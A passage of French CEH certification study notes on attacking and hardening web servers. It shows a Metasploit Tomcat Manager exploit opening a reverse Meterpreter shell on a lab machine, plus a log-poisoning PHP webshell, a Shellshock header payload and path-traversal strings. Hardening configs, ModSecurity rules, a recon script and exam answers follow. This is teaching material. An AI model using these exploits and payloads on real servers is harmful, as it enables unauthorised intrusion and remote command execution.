msf6 exploit(tomcat_mgr_upload) > set RPORT 8180
msf6 exploit(tomcat_mgr_upload) > set HttpUsername tomcat
msf6 exploit(tomcat_mgr_upload) > set HttpPassword tomcat
msf6 exploit(tomcat_mgr_upload) > set PAYLOAD java/meterpreter/reverse_tcp
msf6 exploit(tomcat_mgr_upload) > set LHOST 192.168.1.5
msf6 exploit(tomcat_mgr_upload) > run
```

**Sortie :**
```
[*] Started reverse TCP handler on 192.168.1.5:4444
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying vHPpPWoQq...
[*] Executing vHPpPWoQq...
[*] Sending stage (58849 bytes) to 192.168.1.10
[*] Meterpreter session 1 opened

meterpreter > sysinfo
Computer        : metasploitable
OS              : Linux 2.6.24 Ubuntu i686

meterpreter > getuid
Server username: tomcat55 (110)
```

---

## 📌 PARTIE 5 : CONTRE-MESURES ET HARDENING

### 🔵 Hardening Apache

```bash
# /etc/apache2/conf-available/security.conf

# ── CACHER LES INFORMATIONS SERVEUR ──────────────────────────
ServerTokens Prod        # Affiche seulement "Apache"
ServerSignature Off      # Pas de version dans les pages d'erreur

# ── DÉSACTIVER LES MÉTHODES DANGEREUSES ──────────────────────
<LimitExcept GET POST HEAD>
    Deny from all
</LimitExcept>

# Ou plus explicitement :
<Location />
    <LimitExcept GET POST>
        Require all denied
    </LimitExcept>
</Location>

# ── DÉSACTIVER TRACE ──────────────────────────────────────────
TraceEnable Off

# ── DÉSACTIVER DIRECTORY LISTING ─────────────────────────────
<Directory /var/www/html>
    Options -Indexes          # Pas de listing
    AllowOverride None
    Require all granted
</Directory>

# ── PROTÉGER LES FICHIERS SENSIBLES ──────────────────────────
<FilesMatch "^\.">
    Require all denied        # Cacher .htaccess, .git, etc.
</FilesMatch>

<FilesMatch "\.(bak|old|tmp|sql|conf)$">
    Require all denied        # Bloquer fichiers de sauvegarde
</FilesMatch>

# ── HEADERS DE SÉCURITÉ ───────────────────────────────────────
Header always set X-Frame-Options "SAMEORIGIN"
Header always set X-XSS-Protection "1; mode=block"
Header always set X-Content-Type-Options "nosniff"
Header always set Strict-Transport-Security "max-age=31536000"
Header always set Content-Security-Policy "default-src 'self'"
Header always set Referrer-Policy "strict-origin-when-cross-origin"

# ── DÉSACTIVER WebDAV ─────────────────────────────────────────
# Supprimer ou désactiver mod_dav :
# a2dismod dav dav_fs

# ── LIMITER LA TAILLE DES REQUÊTES ────────────────────────────
LimitRequestBody 10485760   # 10 MB maximum
LimitRequestLine 8190
LimitRequestFields 100

# ── PROTECTION PATH TRAVERSAL ─────────────────────────────────
<Directory />
    Options None
    AllowOverride None
    Require all denied      # Bloquer tout par défaut
</Directory>
```

---

### 🔵 Hardening Nginx

```nginx
# /etc/nginx/nginx.conf

# ── CACHER LA VERSION ─────────────────────────────────────────
server_tokens off;

# ── HEADERS DE SÉCURITÉ ───────────────────────────────────────
add_header X-Frame-Options "SAMEORIGIN" always;
add_header X-XSS-Protection "1; mode=block" always;
add_header X-Content-Type-Options "nosniff" always;
add_header Strict-Transport-Security
    "max-age=31536000; includeSubDomains" always;
add_header Content-Security-Policy
    "default-src 'self'; script-src 'self'" always;

# ── DÉSACTIVER MÉTHODES DANGEREUSES ──────────────────────────
if ($request_method !~ ^(GET|POST|HEAD)$ ) {
    return 405;
}

# ── BLOQUER DIRECTORY TRAVERSAL ──────────────────────────────
location ~* \.\. {
    deny all;
}

# ── PROTÉGER FICHIERS SENSIBLES ──────────────────────────────
location ~ /\. {
    deny all;
    access_log off;
    log_not_found off;
}

location ~* \.(bak|old|sql|conf|git)$ {
    deny all;
}

# ── RATE LIMITING ─────────────────────────────────────────────
limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;
location /api/ {
    limit_req zone=api burst=20 nodelay;
}

# ── DÉSACTIVER WebDAV ─────────────────────────────────────────
# Ne pas inclure le module ngx_http_dav_module
```

---

### 🔵 ModSecurity — WAF Open Source

```bash
# Installation ModSecurity avec Apache
sudo apt install libapache2-mod-security2
sudo a2enmod security2

# Activer les règles OWASP Core Rule Set (CRS)
sudo apt install modsecurity-crs
```

**Configuration ModSecurity :**

```bash
# /etc/modsecurity/modsecurity.conf

# Mode détection → prévention
SecRuleEngine On        # DetectionOnly | On | Off

# Log des requêtes bloquées
SecAuditLog /var/log/apache2/modsec_audit.log
SecAuditLogParts ABIJDEFHZ
SecAuditLogType Serial

# Taille limite
SecRequestBodyLimit 13107200
SecRequestBodyNoFilesLimit 131072
```

**Règles ModSecurity personnalisées :**

```
# Bloquer Path Traversal
SecRule ARGS "@contains ../" \
    "id:1001,\
     phase:2,\
     deny,\
     status:403,\
     log,\
     msg:'Path Traversal Detected',\
     tag:'OWASP_CRS/WEB_ATTACK/DIR_TRAVERSAL'"

# Bloquer injection SQL basique
SecRule ARGS "@detectSQLi" \
    "id:1002,\
     phase:2,\
     deny,\
     status:403,\
     log,\
     msg:'SQL Injection Detected'"

# Bloquer XSS
SecRule ARGS "@detectXSS" \
    "id:1003,\
     phase:2,\
     deny,\
     status:403,\
     log,\
     msg:'XSS Detected'"
```

**Log ModSecurity lors d'une attaque :**
```
--a1b2c3d4-A--
[15/Nov/2024:18:45:00 +0200] 1700000000 192.168.1.5 52341
    192.168.1.10 80

--a1b2c3d4-B--
GET /page.php?file=../../../../etc/passwd HTTP/1.1
Host: 192.168.1.10
User-Agent: Mozilla/5.0

--a1b2c3d4-F--
HTTP/1.1 403 Forbidden
Content-Length: 199

--a1b2c3d4-H--
Message: Warning. Pattern match "../" at ARGS:file.
    [file "/etc/modsecurity/rules/custom.conf"]
    [line "1"]
    [id "1001"]
    [msg "Path Traversal Detected"]
    [data "Matched Data: ../ found within ARGS:file:
           ../../../../etc/passwd"]
    [severity "CRITICAL"]
    [tag "OWASP_CRS/WEB_ATTACK/DIR_TRAVERSAL"]

Action: Intercepted (phase 2)
Apache-Error: Access denied with code 403

→ Attaque bloquée et loggée par ModSecurity !
```

---

## 📌 PARTIE 6 : WORKFLOW PROFESSIONNEL D'AUDIT DE SERVEUR WEB

```bash
#!/bin/bash
# Script d'audit web professionnel CEH
TARGET="http://192.168.1.10"
OUTPUT="/tmp/web_audit_$(date +%Y%m%d)"
mkdir -p $OUTPUT

echo "════════════════════════════════════════"
echo "WEB SERVER AUDIT - $(date)"
echo "Target: $TARGET"
echo "════════════════════════════════════════"

# PHASE 1 : RECONNAISSANCE
echo "[*] Phase 1: Reconnaissance..."

echo "[1.1] Banner Grabbing..."
curl -I $TARGET 2>/dev/null > $OUTPUT/headers.txt

echo "[1.2] WhatWeb fingerprinting..."
whatweb $TARGET > $OUTPUT/whatweb.txt 2>&1

echo "[1.3] Nikto scan..."
nikto -h $TARGET -o $OUTPUT/nikto.txt 2>/dev/null

# PHASE 2 : ÉNUMÉRATION
echo "[*] Phase 2: Enumeration..."

echo "[2.1] Directory bruteforce..."
gobuster dir -u $TARGET \
    -w /usr/share/wordlists/dirb/common.txt \
    -x php,html,txt,bak,old,sql \
    -t 50 \
    -o $OUTPUT/gobuster.txt 2>/dev/null

echo "[2.2] Checking robots.txt..."
curl -s $TARGET/robots.txt > $OUTPUT/robots.txt

echo "[2.3] Checking .git exposure..."
STATUS=$(curl -s -o /dev/null -w "%{http_code}" $TARGET/.git/HEAD)
if [ "$STATUS" = "200" ]; then
    echo "[!] CRITIQUE: .git/ exposé !"
    git-dumper $TARGET/.git/ $OUTPUT/git_dump/ 2>/dev/null
fi

echo "[2.4] Checking phpinfo..."
STATUS=$(curl -s -o /dev/null -w "%{http_code}" $TARGET/phpinfo.php)
if [ "$STATUS" = "200" ]; then
    echo "[!] phpinfo.php exposé !"
fi

# PHASE 3 : TEST DES MÉTHODES HTTP
echo "[*] Phase 3: HTTP Methods..."
METHODS=$(curl -s -X OPTIONS $TARGET -i | grep Allow)
echo $METHODS > $OUTPUT/http_methods.txt
echo "Methods: $METHODS"

if echo $METHODS | grep -qi "TRACE"; then
    echo "[!] TRACE activé → XST possible"
fi
if echo $METHODS | grep -qi "PUT"; then
    echo "[!] PUT activé → Upload possible"
fi
if echo $METHODS | grep -qi "DELETE"; then
    echo "[!] DELETE activé → Suppression possible"
fi

# PHASE 4 : ANALYSE DES RÉSULTATS
echo ""
echo "════════════════════════════════════════"
echo "RÉSULTATS DANS : $OUTPUT/"
echo "════════════════════════════════════════"
ls -la $OUTPUT/
```

---

## 📌 RÉSUMÉ FINAL — CE QUE L'EXAMEN VA TESTER

```
✅ Parts de marché Apache/Nginx/IIS
✅ Fichiers de configuration critiques
✅ Nikto — utilisation et interprétation
✅ Gobuster/FFUF — enumération de répertoires
✅ Directory/Path Traversal — mécanisme et payloads
✅ Log Poisoning — combiner traversal + injection PHP
✅ Méthodes HTTP dangereuses — TRACE, PUT, DELETE
✅ WebDAV — davtest, exploitation PUT
✅ Git repository exposé — git-dumper
✅ SSTI — Server-Side Template Injection
✅ Shellshock CVE-2014-6271 — mécanisme et exploitation
✅ WordPress — WPScan, bruteforce, WAR upload
✅ Tomcat Manager — credentials par défaut, WAR upload
✅ ServerTokens, ServerSignature — cacher les infos
✅ ModSecurity — WAF open source, règles
✅ Headers de sécurité — X-Frame-Options, CSP, HSTS
✅ Désactiver TRACE, PUT, DELETE, WebDAV
✅ Protection Path Traversal — validation d'input
```

---

## 🧪 QUESTIONS TYPE EXAMEN CEH — MODULE 13

**Q1 :** Comment un attaquant exploite une vulnérabilité Path Traversal pour lire /etc/passwd ?
> **Réponse : En ajoutant `../../../../etc/passwd` dans un paramètre de fichier. Les `../` remontent dans l'arborescence jusqu'à la racine, puis descendent vers /etc/passwd. Si l'application ne valide pas l'input, le fichier est lu.**

**Q2 :** Qu'est-ce que le Log Poisoning et comment mène-t-il à un RCE ?
> **Réponse : Injecter du code PHP dans le User-Agent (qui est loggé par Apache), puis lire le log via Path Traversal. PHP interprète le code injecté dans le log → RCE. Exemple : User-Agent: `<?php system($_GET['cmd']); ?>`**

**Q3 :** Pourquoi la méthode HTTP PUT est-elle dangereuse si activée sans authentification ?
> **Réponse : Elle permet d'uploader n'importe quel fichier directement sur le serveur web, incluant un webshell PHP. L'attaquant peut ensuite exécuter des commandes système en accédant au fichier uploadé.**

**Q4 :** Quelle commande permet de vérifier les méthodes HTTP autorisées par un serveur ?
> **Réponse : `curl -X OPTIONS http://target.com -v` — la réponse inclut le header `Allow:` listant toutes les méthodes acceptées.**

**Q5 :** Qu'est-ce que Shellshock (CVE-2014-6271) et quel est le vecteur d'exploitation web ?
> **Réponse : Vulnérabilité Bash qui exécute du code après la définition d'une fonction. Via HTTP, l'attaquant injecte le payload `() { :; }; commande` dans le User-Agent. Les scripts CGI qui passent les headers à Bash exécutent la commande.**

**Q6 :** Comment davtest aide-t-il l'exploitation de WebDAV ?
> **Réponse : davtest teste automatiquement quels types de fichiers peuvent être uploadés ET exécutés via WebDAV. S'il trouve que les fichiers PHP sont uploadables et exécutables, l'attaquant peut déposer un webshell.**

**Q7 :** Pourquoi exposer un répertoire .git/ sur un serveur web est-il critique ?
> **Réponse : L'outil git-dumper peut reconstruire tout le code source depuis les objets Git. Le code peut contenir des credentials (DB, API, AWS), des configurations sensibles, et l'historique Git révèle même les secrets "supprimés" dans les commits précédents.**

**Q8 :** Quelle directive Apache empêche l'affichage de la version du serveur ?
> **Réponse : `ServerTokens Prod` (affiche seulement "Apache" sans version) et `ServerSignature Off` (supprime la signature dans les pages d'erreur). Ces deux directives réduisent la surface d'information disponible à l'attaquant.**

**Q9 :** Comment ModSecurity fonctionne-t-il en mode prévention contre Path Traversal ?
> **Réponse : ModSecurity analyse chaque requête HTTP. Une règle peut détecter `../` dans les paramètres (ex: `SecRule ARGS "@contains ../"`) et retourner une réponse 403 Forbidden, bloquant l'attaque avant qu'elle atteigne l'application.**

**Q10 :** Qu'est-ce que le SSTI et pourquoi est-il critique ?
> **Réponse : Server-Side Template Injection = injection de code dans un moteur de template (Jinja2, Twig, Freemarker). Si l'input utilisateur est inséré directement dans un template sans sanitisation, l'attaquant peut exécuter des expressions arbitraires, menant au RCE. Test : envoyer `{{7*7}}` et vérifier si la réponse contient 49.**

---

> **Module 13 terminé. **
